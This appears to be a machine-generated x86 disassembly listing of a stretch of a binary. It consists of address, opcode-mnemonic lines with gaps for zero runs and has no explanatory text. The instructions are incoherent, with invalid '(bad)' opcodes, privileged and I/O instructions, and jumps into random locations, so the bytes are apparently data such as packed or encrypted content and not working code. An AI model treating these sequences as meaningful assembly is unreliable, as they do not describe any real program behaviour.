  42417b:	fsub   QWORD PTR [eax+ecx*4-0x92364f4]
  424182:	jmp    0x1929d457
  424187:	in     al,dx
  424188:	jl     0x424186
  42418a:	outs   dx,DWORD PTR ds:[esi]
  42418b:	pop    eax
  42418c:	xor    al,0xb
  42418e:	sbb    ebp,ebp
  424190:	add    eax,0x256c5b5
  424195:	loop   0x424171
  424197:	sbb    BYTE PTR ds:0x1d46a601,0x41
  42419e:	cli    
  42419f:	(bad)  
  4241a0:	das    
  4241a1:	aad    0x3e
  4241a3:	imul   ecx,ecx,0x2f
  4241a6:	popf   
  4241a7:	mov    ecx,0xe5c27fee
  4241ac:	ss push es
  4241ae:	cmc    
  4241af:	xchg   ebp,eax
  4241b0:	xchg   BYTE PTR ds:0x901f26af,cl
  4241b6:	cdq    
  4241b7:	stos   DWORD PTR es:[edi],eax
  4241b8:	stos   DWORD PTR es:[edi],eax
  4241b9:	test   BYTE PTR [ebx+0x3aee4a37],bh
  4241bf:	and    eax,0xc2b8e31b
  4241c4:	ins    DWORD PTR es:[edi],dx
  4241c5:	lock adc edx,ecx
  4241c8:	les    edx,FWORD PTR [ebx]
  4241ca:	outs   dx,BYTE PTR ds:[esi]
  4241cb:	mov    edi,0x8bc07840
  4241d0:	jmp    0x4241dd
  4241d2:	clc    
  4241d3:	int3   
  4241d4:	retf   
  4241d5:	inc    edx
  4241d6:	lea    ecx,[ecx+0x2b9ea9f4]
  4241dc:	and    bh,BYTE PTR [ecx+edx*4+0x11d6d85b]
  4241e3:	(bad)  
  4241e5:	dec    ebx
  4241e6:	lock mov WORD PTR [ebx-0x43],ds
  4241ea:	(bad)  
  4241ec:	push   ecx
  4241ed:	ja     0x4241ec
  4241ef:	retf   0xb95d
  4241f2:	dec    ebx
  4241f3:	adc    al,ch
  4241f5:	jmp    0x24154c20
  4241fa:	adc    eax,DWORD PTR [edi]
  4241fc:	and    dh,BYTE PTR [ecx+esi*4]
  4241ff:	repz popf 
  424201:	ja     0x4241cf
  424203:	fcomp  QWORD PTR [eax+esi*2-0x28384f46]
  42420a:	sub    BYTE PTR [ecx+0x27],dl
  42420d:	jbe    0x424229
  42420f:	add    al,0x0
	...
  424271:	add    BYTE PTR [eax],al
  424273:	add    BYTE PTR [edi-0x4c275c4c],al
  424279:	(bad)  
  42427b:	push   DWORD PTR [ecx+0x7]
  42427e:	sub    al,0x5c
  424280:	retf   0xc65d
  424283:	inc    edi
  424284:	nop
  424285:	add    DWORD PTR [ecx],0x10400
  42428b:	add    BYTE PTR [edi+0xc8d8b25],bh
  424291:	rol    al,cl
  424293:	adc    dl,BYTE PTR [edx+0x72fdea8c]
  424299:	adc    al,0x48
  42429b:	clc    
  42429c:	push   eax
  42429d:	ret    
  42429e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42429f:	add    dh,BYTE PTR [ebx]
  4242a1:	xor    al,BYTE PTR [edx-0x655caf78]
  4242a7:	dec    eax
  4242a8:	cs xchg ebx,eax
  4242aa:	push   0xd17975e4
  4242af:	xchg   ebp,eax
  4242b0:	sub    DWORD PTR [esi-0x2d],eax
  4242b3:	mov    esp,0x72b4bc97
  4242b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4242b9:	shr    BYTE PTR [ebp+0xe],1
  4242bc:	cs push esi
  4242be:	pop    eax
  4242bf:	mov    bl,BYTE PTR [ebp-0x62449e79]
  4242c5:	rol    BYTE PTR [esi+0x65],0x8e
  4242c9:	pop    esi
  4242ca:	inc    ecx
  4242cb:	mov    ds:0x2c367872,eax
  4242d0:	lods   eax,DWORD PTR ds:[esi]
  4242d1:	xchg   edi,eax
  4242d2:	aam    0xdf
  4242d4:	inc    edx
  4242d5:	xor    al,0x31
  4242d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242d8:	cmp    DWORD PTR [esi],ebx
  4242da:	pop    edi
  4242db:	add    bh,BYTE PTR [edx+0x48387499]
  4242e1:	pop    ds
  4242e2:	push   eax
  4242e3:	aad    0xed
  4242e5:	rol    BYTE PTR [edx],cl
  4242e7:	pop    edi
  4242e8:	rcr    BYTE PTR [ebx+0x4f],0xa4
  4242ec:	xchg   edx,eax
  4242ed:	xchg   esi,eax
  4242ee:	lods   al,BYTE PTR ds:[esi]
  4242ef:	dec    ebx
  4242f0:	das    
  4242f1:	outs   dx,DWORD PTR ds:[esi]
  4242f2:	mov    ?,WORD PTR [ecx+0x68]
  4242f5:	lahf   
  4242f6:	inc    edi
  4242f7:	push   ss
  4242f8:	les    ecx,FWORD PTR [esp+esi*8+0x47d922af]
  4242ff:	aam    0x12
  424301:	xchg   esi,eax
  424302:	imul   esi,edx,0x4a
  424305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424306:	psubq  mm4,QWORD PTR [ecx]
  424309:	push   ebp
  42430a:	add    DWORD PTR [ebp-0x33069a91],edi
  424310:	js     0x4242f0
  424312:	test   al,0xf9
  424314:	test   al,0xf7
  424316:	rol    DWORD PTR [esi-0x28f95f00],1
  42431c:	or     esi,edx
  42431e:	mov    bl,0xcf
  424320:	sbb    DWORD PTR [ecx+0x76],edx
  424323:	xor    esi,DWORD PTR [ebx+0x2dc0c4d5]
  424329:	test   al,0xcf
  42432b:	(bad)  
  42432c:	xchg   edx,eax
  42432d:	pop    eax
  42432e:	mov    bh,BYTE PTR [edx+0x455e85f0]
  424334:	push   edi
  424335:	mov    bl,0x12
  424337:	sub    al,0xdd
  424339:	outs   dx,BYTE PTR cs:[esi]
  42433b:	retf   
  42433c:	sar    DWORD PTR [edx],0x78
  42433f:	mov    dl,0x5e
  424341:	addr16 and al,0xb8
  424344:	lock sbb DWORD PTR [ecx],eax
  424347:	mov    ebp,0x4bc84af8
  42434c:	push   edx
  42434d:	in     eax,dx
  42434e:	imul   edx,esp,0xffffff8c
  424351:	ins    DWORD PTR es:[edi],dx
  424352:	test   eax,0x25a69795
  424357:	stos   DWORD PTR es:[edi],eax
  424358:	sub    BYTE PTR [eax-0x6c],0x58
  42435c:	xchg   BYTE PTR [edi+0x514c3c85],bl
  424362:	xchg   BYTE PTR [eax-0x1e],bl
  424365:	clc    
  424366:	adc    eax,0xf5967606
  42436b:	iret   
  42436c:	push   es
  42436d:	cmp    eax,0x38d2cf10
  424372:	cwde   
  424373:	std    
  424374:	int3   
  424375:	ret    0x1c53
  424378:	dec    edx
  424379:	mov    esi,0x6b601f47
  42437e:	add    edx,DWORD PTR ds:0xd7aa2169
  424384:	jp     0x424366
  424386:	pop    edx
  424387:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424388:	shr    edx,cl
  42438a:	pop    edi
  42438b:	je     0x42435f
  42438d:	std    
  42438e:	mov    al,0xf5
	...
  4243f4:	mov    ah,BYTE PTR [esi]
  4243f6:	jge    0x4243b2
  4243f8:	std    
  4243f9:	sti    
  4243fa:	iret   
  4243fb:	ss aam 0xb
  4243fe:	push   ss
  4243ff:	jno    0x424426
  424401:	dec    ebx
  424402:	cld    
  424403:	les    edx,FWORD PTR [edx+eax*4+0x1040001]
  42440a:	add    BYTE PTR [eax],al
  42440c:	(bad)  
  42440d:	pop    edx
  42440e:	cs pusha 
  424410:	adc    BYTE PTR [eax-0x40695d58],bh
  424416:	mov    al,0xec
  424418:	cmp    ah,BYTE PTR [ecx-0x9]
  42441b:	repnz test eax,0xfea98325
  424421:	mov    bh,bl
  424423:	jmp    0x4243b1
  424425:	add    edi,eax
  424427:	push   edi
  424428:	loop   0x42445f
  42442a:	push   ds
  42442b:	mov    ds:0x8ab7c3,al
  424430:	xchg   edx,eax
  424431:	inc    ecx
  424432:	add    BYTE PTR [eax],dh
  424434:	cmp    edi,DWORD PTR [ecx]
  424436:	dec    edx
  424437:	mov    eax,ds:0xf23fd560
  42443c:	out    dx,al
  42443d:	sbb    DWORD PTR [eax],ebx
  42443f:	and    ebp,DWORD PTR [edi-0x2c]
  424442:	push   es
  424443:	call   0x716fd154
  424448:	mov    BYTE PTR [ecx+eax*8+0x70d93788],dl
  42444f:	mov    ch,0x9a
  424451:	(bad)  
  424452:	jmp    0xbb9f:0x8e0586ca
  424459:	ret    0x2ec5
  42445c:	fwait
  42445d:	cmp    al,0xe
  42445f:	inc    esi
  424460:	add    DWORD PTR [ebx],ebx
  424462:	nop
  424463:	repz adc al,0x88
  424466:	add    eax,0x5c75700f
  42446b:	mov    DWORD PTR [eax],edx
  42446d:	and    al,0x6
  42446f:	daa    
  424470:	les    edi,FWORD PTR [eax-0x5a25f28]
  424476:	cmc    
  424477:	lds    ebx,FWORD PTR [ecx]
  424479:	cmc    
  42447a:	das    
  42447b:	mov    ch,0x47
  42447d:	pop    eax
  42447e:	dec    ecx
  42447f:	aaa    
  424480:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424481:	retf   0xe7f4
  424484:	fsub   DWORD PTR [edx]
  424486:	call   0xccf02193
  42448b:	(bad)  
  42448c:	adc    DWORD PTR [esi],0xffffffbe
  42448f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424490:	in     al,0xdf
  424492:	aaa    
  424493:	(bad)  
  424495:	stc    
  424496:	push   cs
  424497:	fmul   DWORD PTR [eax]
  424499:	wrmsr  
  42449b:	ja     0x424457
  42449d:	xor    al,0x61
  42449f:	call   0x538ac8c9
  4244a4:	sbb    edx,ebx
  4244a6:	jmp    0x6fb7:0x335c753f
  4244ad:	pop    eax
  4244ae:	adc    DWORD PTR [eax+esi*4+0x117208f3],esi
  4244b5:	rcr    BYTE PTR [ebx-0x46],1
  4244b8:	popf   
  4244b9:	mov    ecx,0xd0e4a1d6
  4244be:	dec    edi
  4244bf:	mov    ah,0xbe
  4244c1:	jno    0x4244cb
  4244c3:	dec    edx
  4244c4:	dec    esi
  4244c5:	jl     0x4244ab
  4244c7:	dec    esp
  4244c8:	push   edx
  4244c9:	fwait
  4244ca:	add    eax,0x661adf97
  4244cf:	aas    
  4244d0:	ds pop esp
  4244d2:	je     0x42449d
  4244d4:	and    ecx,DWORD PTR [eax+0x5729825d]
  4244da:	out    dx,al
  4244db:	jp     0x42448d
  4244dd:	xchg   esp,eax
  4244de:	into   
  4244df:	xchg   BYTE PTR [edx+0x24],cl
  4244e2:	lds    ebp,FWORD PTR [ecx-0x47]
  4244e5:	sbb    dh,al
  4244e7:	pop    es
  4244e8:	mov    al,ds:0x74efc9d6
  4244ed:	dec    ebp
  4244ee:	mov    cl,0x47
  4244f0:	aam    0xcf
  4244f2:	cmp    BYTE PTR [ebp-0x664c1921],0x6a
  4244f9:	add    cl,BYTE PTR [ebp+0x29]
  4244fc:	mov    eax,0xbec85a64
  424501:	jnp    0x42448b
  424503:	out    0x49,eax
  424505:	or     eax,0xc2c776cc
  42450a:	clc    
  42450b:	mov    bl,0x6d
  42450d:	add    BYTE PTR [eax+eiz*1+0x0],0x0
	...
  424571:	add    BYTE PTR [eax],al
  424573:	add    al,ah
  424575:	outs   dx,DWORD PTR ds:[esi]
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x56],1
  424581:	es pop eax
  424583:	pop    ecx
  424584:	cwde   
  424585:	add    DWORD PTR [ecx],0x0
  424588:	add    al,0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	in     eax,0x7b
  42458e:	push   ebx
  42458f:	inc    ebp
  424590:	dec    edx
  424591:	mov    dh,0xcd
  424593:	xchg   esp,eax
  424594:	es clc 
  424596:	sbb    ebx,DWORD PTR [ecx+0x671ea7e0]
  42459c:	mov    ebx,0x759b3172
  4245a1:	push   0x6899d760
  4245a6:	(bad)  
  4245a7:	mov    WORD PTR [eax-0x26],?
  4245aa:	outs   dx,BYTE PTR ds:[esi]
  4245ab:	mov    bh,0x4c
  4245ad:	ret    
  4245ae:	pop    ebp
  4245af:	ins    DWORD PTR es:[edi],dx
  4245b0:	nop
  4245b1:	loop   0x424627
  4245b3:	mov    eax,ds:0x3cf22f49
  4245b8:	and    dl,al
  4245ba:	stos   DWORD PTR es:[edi],eax
  4245bb:	(bad)  
  4245bc:	outs   dx,DWORD PTR ds:[esi]
  4245bd:	add    ecx,DWORD PTR [eax+0x7ea76126]
  4245c3:	test   BYTE PTR [edx],ch
  4245c5:	sahf   
  4245c6:	fdivr  st,st(4)
  4245c8:	xor    ecx,0x5712d59e
  4245ce:	xor    eax,0x2b43820e
  4245d3:	dec    ecx
  4245d4:	fcom   st(7)
  4245d6:	sub    DWORD PTR [eax+edi*8],esi
  4245d9:	sbb    DWORD PTR [esi],ebx
  4245db:	outs   dx,DWORD PTR ds:[esi]
  4245dc:	fsub   DWORD PTR [edi-0x5e]
  4245df:	pushf  
  4245e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245e1:	das    
  4245e2:	inc    eax
  4245e3:	sub    eax,0x6ea20955
  4245e8:	je     0x4245db
  4245ea:	mov    edi,0x721f396f
  4245ef:	addr16 inc ebx
  4245f1:	retf   0xe787
  4245f4:	(bad)  
  4245f6:	sub    ecx,DWORD PTR [eax-0x3e]
  4245f9:	mov    edx,DWORD PTR [eax+ecx*4+0x622a2ca2]
  424600:	ins    BYTE PTR es:[edi],dx
  424601:	push   ecx
  424602:	cdq    
  424603:	sub    eax,0x25450551
  424608:	jmp    0x4245e6
  42460a:	std    
  42460b:	test   al,0xb0
  42460d:	ins    DWORD PTR es:[edi],dx
  42460e:	mov    dl,0xe4
  424610:	das    
  424611:	sub    eax,0xa428eab
  424616:	mov    bl,0xf
  424618:	(bad)
  42461c:	cmp    eax,edi
  42461e:	dec    esp
  42461f:	jecxz  0x4245cd
  424621:	test   al,0x36
  424623:	stc    
  424624:	(bad)  
  424625:	imul   esp,esi,0xcf4708ab
  42462b:	nop
  42462c:	fsub   st,st(7)
  42462e:	mov    WORD PTR [esi-0x7a],ss
  424631:	test   esi,ecx
  424633:	xor    al,BYTE PTR [eax+ebx*8+0x7ea3a35e]
  42463a:	lods   eax,DWORD PTR ds:[esi]
  42463b:	sub    al,0xb5
  42463d:	mov    ebx,0x3a79686d
  424642:	pushf  
  424643:	ins    BYTE PTR es:[edi],dx
  424644:	jne    0x424691
  424646:	in     eax,dx
  424647:	retf   0xd851
  42464a:	dec    ebx
  42464b:	dec    ebx
  42464c:	push   cs
  42464d:	cmp    al,0xf2
  42464f:	push   esp
  424650:	fwait
  424651:	and    BYTE PTR [esi-0x5a],cl
  424654:	add    eax,0x1fb62da4
  424659:	pop    ebp
  42465a:	gs dec ecx
  42465c:	lods   eax,DWORD PTR ds:[esi]
  42465d:	jnp    0x4246bd
  42465f:	pop    edx
  424660:	lods   eax,DWORD PTR ds:[esi]
  424661:	imul   ecx,edi,0x3b
  424664:	fwait
  424665:	jno    0x424619
  424667:	xchg   ebx,eax
  424668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424669:	xor    DWORD PTR [eax],0x2ce7d18a
  42466f:	jno    0x424697
  424671:	out    0xed,al
  424673:	das    
  424674:	xor    eax,0x6f8d270e
  424679:	outs   dx,BYTE PTR ds:[esi]
  42467a:	mov    BYTE PTR [edi-0x5a],0x4b
  42467e:	cs jne 0x4246f4
  424681:	add    BYTE PTR [ecx-0x42af525],cl
  424687:	lea    edi,[ebx-0x6063cbed]
  42468d:	test   BYTE PTR [ecx],ch
  42468f:	or     eax,0x0
	...
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [ecx],ch
  424701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424702:	imul   bx,WORD PTR [esp+eax*4+0x1040001],0x0
  42470b:	add    BYTE PTR [ebp-0x73],bl
  42470e:	cdq    
  42470f:	stc    
  424710:	xor    DWORD PTR [esi-0x61],0x78
  424714:	sbb    BYTE PTR [ecx+0x75ec65ea],al
  42471a:	test   BYTE PTR [edx-0x4f],0xec
  42471e:	mov    esi,0x4b80f365
  424723:	in     al,dx
  424724:	rol    DWORD PTR [esi+0x1075c609],0x3f
  42472b:	lahf   
  42472c:	adc    edi,DWORD PTR [edi-0x75bbd7aa]
  424732:	lahf   
  424733:	sub    eax,DWORD PTR [ebp+0xea3fc19]
  424739:	jne    0x42473e
  42473b:	iret   
  42473c:	adc    BYTE PTR [esi+0x4fb6b5be],al
  424742:	shl    DWORD PTR [ecx-0x717cf332],cl
  424748:	mov    edi,DWORD PTR [ecx+0x1571e555]
  42474e:	push   ecx
  42474f:	mov    ah,0x2b
  424751:	aam    0x26
  424753:	pop    edx
  424754:	and    ah,al
  424756:	jmp    0xc4c:0x543e5d27
  42475d:	jmp    0xc756:0xec893e50
  424764:	push   ds
  424765:	jne    0x4247e4
  424767:	xor    esi,edx
  424769:	and    DWORD PTR [esi+0x40762dfa],edx
  42476f:	call   0x804bdc56
  424774:	push   edx
  424775:	jno    0x424760
  424777:	popa   
  424778:	pop    ebp
  424779:	xchg   DWORD PTR [ecx],esp
  42477b:	leave  
  42477c:	jmp    0x4247ea
  42477e:	push   esp
  42477f:	ins    BYTE PTR es:[edi],dx
  424780:	(bad)  
  424781:	jno    0x4247cc
  424783:	inc    esp
  424784:	adc    ah,BYTE PTR ds:0x6e4df1aa
  42478a:	add    al,0xac
  42478c:	xchg   esp,eax
  42478d:	xchg   DWORD PTR [ebx+0x4490ab30],esp
  424793:	ds jl  0x4247bd
  424796:	loopne 0x42476d
  424798:	push   0x31
  42479a:	cdq    
  42479b:	das    
  42479c:	int3   
  42479d:	xchg   esp,eax
  42479e:	int3   
  42479f:	gs (bad) 
  4247a1:	ficomp WORD PTR [edx+0x5f0efb90]
  4247a7:	jg     0x42479a
  4247a9:	inc    esi
  4247aa:	push   0x78e19ff2
  4247af:	ror    esi,0x54
  4247b2:	sbb    al,0x3
  4247b4:	dec    edi
  4247b5:	pop    ss
  4247b6:	pop    es
  4247b7:	jle    0x4247d3
  4247b9:	mov    ds:0xb4792602,eax
  4247be:	imul   BYTE PTR [edx]
  4247c0:	not    BYTE PTR [eax-0x4f2d3b37]
  4247c6:	mov    BYTE PTR [ebp-0x18],bh
  4247c9:	jl     0x42482a
  4247cb:	(bad)  [ebx-0x24b46851]
  4247d1:	aam    0x76
  4247d3:	jl     0x42483e
  4247d5:	ja     0x424781
  4247d7:	gs aam 0xc2
  4247da:	or     DWORD PTR [edx+eiz*1-0x781f348a],ecx
  4247e1:	adc    ebp,esp
  4247e3:	push   es
  4247e4:	or     BYTE PTR [esi+0x27135e4b],dl
  4247ea:	js     0x4247ec
  4247ec:	and    DWORD PTR [esi+0x3f],0xffffffe1
  4247f0:	cmp    bh,al
  4247f2:	mov    ds:0x949cfb2a,al
  4247f7:	xor    DWORD PTR es:[ebx],ecx
  4247fa:	fwait
  4247fb:	pop    ebp
  4247fc:	bound  ecx,QWORD PTR [edx-0x556b9c09]
  424802:	das    
  424803:	inc    esp
  424804:	dec    esi
  424805:	and    bh,ch
  424807:	inc    esi
  424808:	sbb    bl,BYTE PTR [ebx+0x2140bcf0]
  42480e:	jp     0x424872
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	stos   BYTE PTR es:[edi],al
  424881:	popf   
  424882:	adc    BYTE PTR [ecx+0x185a0],bh
  424888:	add    al,0x1
  42488a:	add    BYTE PTR [eax],al
  42488c:	jae    0x4248f2
  42488e:	jae    0x42481b
  424890:	lock push ebx
  424892:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424893:	sbb    BYTE PTR [esp+esi*1],ah
  424896:	into   
  424897:	in     al,0xe6
  424899:	push   es
  42489a:	inc    eax
  42489b:	scas   al,BYTE PTR es:[edi]
  42489c:	or     eax,0xd63f12d3
  4248a1:	mov    ebp,0x5a6f00f0
  4248a6:	add    al,0x51
  4248a8:	js     0x42485d
  4248aa:	aaa    
  4248ab:	(bad)  
  4248ac:	xchg   edi,eax
  4248ad:	and    DWORD PTR [ecx-0xa],ebx
  4248b0:	xchg   esi,eax
  4248b1:	and    al,0x3c
  4248b3:	call   0x216dc81e
  4248b8:	inc    ebp
  4248b9:	mov    edi,ds
  4248bb:	push   ebp
  4248bc:	(bad)  
  4248be:	inc    edx
  4248bf:	jl     0x4248a0
  4248c1:	mov    edi,DWORD PTR cs:[ebx+edx*1-0x11]
  4248c6:	mov    dh,0x6e
  4248c8:	push   cs
  4248c9:	rol    DWORD PTR [edx-0x5244425d],cl
  4248cf:	pop    edx
  4248d0:	or     ecx,DWORD PTR [edx]
  4248d2:	shl    BYTE PTR [edi],1
  4248d4:	int    0x1f
  4248d6:	aas    
  4248d7:	lahf   
  4248d8:	sub    esi,ebx
  4248da:	test   eax,0x295a57c9
  4248df:	in     al,dx
  4248e0:	in     eax,0x42
  4248e2:	inc    edx
  4248e3:	pop    edx
  4248e4:	xor    DWORD PTR [edi+0x25],esi
  4248e7:	cwde   
  4248e8:	cmp    eax,0x6731ab51
  4248ed:	push   ecx
  4248ee:	xchg   edx,eax
  4248ef:	push   ebp
  4248f0:	cmc    
  4248f1:	xchg   esi,eax
  4248f2:	adc    dl,bh
  4248f4:	mov    gs,ecx
  4248f6:	mov    ah,0x55
  4248f8:	icebp  
  4248f9:	mov    DWORD PTR [ebx+eax*4+0x41296223],eax
  424900:	je     0x42493b
  424902:	xlat   BYTE PTR ds:[ebx]
  424903:	add    edi,DWORD PTR [edi+0x32a29a65]
  424909:	pop    ecx
  42490a:	(bad)  
  42490b:	inc    ebx
  42490c:	bound  eax,QWORD PTR [ebp+0x42]
  42490f:	stos   BYTE PTR es:[edi],al
  424910:	mov    dh,0x7b
  424912:	les    edx,FWORD PTR [esi+0x12]
  424915:	cld    
  424916:	jmp    0x93e0:0x13c360ad
  42491d:	push   esp
  42491e:	jae    0x4248bb
  424920:	aas    
  424921:	popa   
  424922:	add    al,0xf
  424924:	test   DWORD PTR ds:[esi],0x6b97fdf2
  42492b:	mov    dh,BYTE PTR [eax+0x7d]
  42492e:	ins    BYTE PTR es:[edi],dx
  42492f:	xlat   BYTE PTR ds:[ebx]
  424930:	add    eax,0xe35e27a6
  424935:	and    dl,BYTE PTR [eax+0x7240d3b9]
  42493b:	in     eax,0xa6
  42493d:	add    al,0x89
  42493f:	xchg   esp,eax
  424940:	mov    esp,DWORD PTR [ebx+ecx*4]
  424943:	iret   
  424944:	sub    edi,DWORD PTR [edx]
  424946:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424947:	mov    al,ds:0x5cc7e62e
  42494c:	xor    BYTE PTR [esi],dl
  42494e:	int3   
  42494f:	adc    eax,0x11514ba9
  424954:	psubb  mm1,QWORD PTR [edi-0x1e213ee6]
  42495b:	and    DWORD PTR [esi],0x4de2f6fb
  424961:	add    edx,DWORD PTR [esi]
  424963:	cld    
  424964:	mov    al,ds:0xb1911286
  424969:	dec    edi
  42496a:	pusha  
  42496b:	sub    edx,DWORD PTR [ebp-0x2c]
  42496e:	mov    esp,edx
  424970:	repnz and al,0x67
  424973:	(bad)  
  424974:	(bad)  ds:0xc3b7cd31
  42497a:	sbb    ebx,DWORD PTR [esi+0x6f]
  42497d:	loopne 0x4249b6
  42497f:	dec    ecx
  424980:	mov    WORD PTR [edx],es
  424982:	mov    ds:0xa5c57965,eax
  424987:	sbb    al,BYTE PTR [ecx+eax*2]
  42498a:	loopne 0x4249e6
  42498c:	cld    
  42498d:	mov    dh,0xce
  42498f:	sub    al,0x0
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    al,ch
  424a01:	hlt    
  424a02:	ret    0xa444
  424a05:	xchg   BYTE PTR [ecx],al
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	jno    0x4249c3
  424a0e:	dec    DWORD PTR [ebx+0x3a]
  424a11:	cli    
  424a12:	sub    BYTE PTR [edx+eax*2],bl
  424a15:	inc    esp
  424a16:	aad    0xf3
  424a18:	xchg   esp,eax
  424a19:	xchg   ebx,eax
  424a1a:	xor    eax,0x9370dc3e
  424a1f:	dec    eax
  424a20:	xor    eax,0x80e01591
  424a25:	dec    ecx
  424a26:	fnstenv cs:[ebx+0xe]
  424a2a:	and    ecx,ecx
  424a2c:	push   ebp
  424a2d:	cmp    DWORD PTR [edi],eax
  424a2f:	add    al,0x0
  424a31:	das    
  424a32:	outs   dx,BYTE PTR ds:[esi]
  424a33:	pop    edx
  424a34:	mov    dl,0xb
  424a36:	push   ds
  424a37:	inc    esp
  424a38:	adc    DWORD PTR [edi-0x50be0b57],esp
  424a3e:	jbe    0x4249e8
  424a40:	test   DWORD PTR [ebx-0x6d],esi
  424a43:	dec    esp
  424a44:	stc    
  424a45:	push   ecx
  424a46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a47:	icebp  
  424a48:	fwait
  424a49:	xchg   ecx,eax
  424a4a:	or     ebx,DWORD PTR [edx+edi*4]
  424a4d:	pop    ebp
  424a4e:	lock inc edx
  424a50:	or     ecx,DWORD PTR [ebp+0x458b913a]
  424a56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a57:	in     al,dx
  424a58:	adc    BYTE PTR [esi-0x7d],0xf2
  424a5c:	ins    BYTE PTR es:[edi],dx
  424a5d:	sub    eax,0x3595053b
  424a62:	jp     0x424a31
  424a64:	out    dx,eax
  424a65:	xchg   ebp,eax
  424a66:	shr    DWORD PTR [eax],1
  424a68:	dec    ecx
  424a69:	xor    edx,DWORD PTR [eax+eax*8]
  424a6c:	loop   0x424ac1
  424a6e:	and    eax,0x3af13338
  424a73:	push   ebx
  424a74:	jb     0x424ade
  424a76:	push   0x7b
  424a78:	outs   dx,BYTE PTR ds:[esi]
  424a79:	add    BYTE PTR [ebx],bh
  424a7b:	cwde   
  424a7c:	xchg   ebx,eax
  424a7d:	in     eax,dx
  424a7e:	mov    esp,0xa4aba27
  424a83:	jmp    0x424acc
  424a85:	fnstcw WORD PTR [eax+edx*1+0x61]
  424a89:	test   al,0x1d
  424a8b:	es dec eax
  424a8d:	lea    ecx,[bp+0x1400]
  424a92:	enter  0xd79d,0x6
  424a96:	in     al,0xd9
  424a98:	dec    ebx
  424a99:	xor    dl,BYTE PTR [edx+0x64e74a8d]
  424a9f:	cdq    
  424aa0:	or     cl,dl
  424aa2:	push   ecx
  424aa3:	mov    al,cl
  424aa5:	cwde   
  424aa6:	jg     0x424a9f
  424aa8:	ins    DWORD PTR es:[edi],dx
  424aa9:	or     al,0x23
  424aab:	daa    
  424aac:	pop    ecx
  424aad:	jecxz  0x424a55
  424aaf:	cmp    bh,BYTE PTR [ebx+0x329f1842]
  424ab5:	sub    eax,0xbda5259
  424aba:	ss mov ebp,0xd7c17a7d
  424ac0:	sub    cl,0x72
  424ac3:	pop    edi
  424ac4:	pop    edx
  424ac5:	(bad)  
  424ac6:	scas   al,BYTE PTR es:[edi]
  424ac7:	bound  ebp,QWORD PTR [eax]
  424ac9:	sbb    esi,DWORD PTR [ebx+ecx*8+0x4e]
  424acd:	mov    ?,ecx
  424acf:	(bad)  
  424ad0:	out    dx,al
  424ad1:	pop    esi
  424ad2:	daa    
  424ad3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424ad4:	cmp    bh,dh
  424ad6:	repnz dec edx
  424ad8:	popa   
  424ad9:	repz test eax,0x480efef1
  424adf:	fild   QWORD PTR [edx+0x20]
  424ae2:	adc    BYTE PTR [edi+0x5a],ch
  424ae5:	push   esi
  424ae6:	push   es
  424ae7:	cdq    
  424ae8:	loopne 0x424aa5
  424aea:	pop    ds
  424aeb:	lock js 0x424b48
  424aee:	mov    ah,0xf9
  424af0:	pushf  
  424af1:	push   cs
  424af2:	push   cs
  424af3:	xor    BYTE PTR [ebp-0x1c],bh
  424af6:	loop   0x424aec
  424af8:	fisubr DWORD PTR [ecx-0x3b]
  424afb:	cmp    DWORD PTR [eax+eax*2+0x2a],ebx
  424aff:	push   0x77
  424b01:	adc    dh,BYTE PTR [edi-0x57]
  424b04:	popa   
  424b05:	sub    dh,bh
  424b07:	(bad)  
  424b08:	dec    ecx
  424b09:	jle    0x424aa5
  424b0b:	xchg   ebp,eax
  424b0c:	jp     0x42c98e
	...
  424b72:	add    BYTE PTR [eax],al
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	adc    al,0x86
  424b82:	loope  0x424bf1
  424b84:	test   al,0x87
  424b86:	add    DWORD PTR [eax],eax
  424b88:	add    al,0x1
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	js     0x424c0b
  424b8e:	push   ss
  424b8f:	sub    BYTE PTR [eax],bl
  424b91:	or     al,0x97
  424b93:	adc    BYTE PTR [ecx-0x67],dh
  424b96:	cmc    
  424b97:	xchg   esp,eax
  424b98:	sbb    BYTE PTR [edi],0x46
  424b9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424b9c:	ins    BYTE PTR es:[edi],dx
  424b9d:	test   eax,0x6a01a81f
  424ba2:	ficomp DWORD PTR [ecx]
  424ba4:	xchg   ebp,eax
  424ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424ba6:	mov    cl,BYTE PTR [esi+0x13]
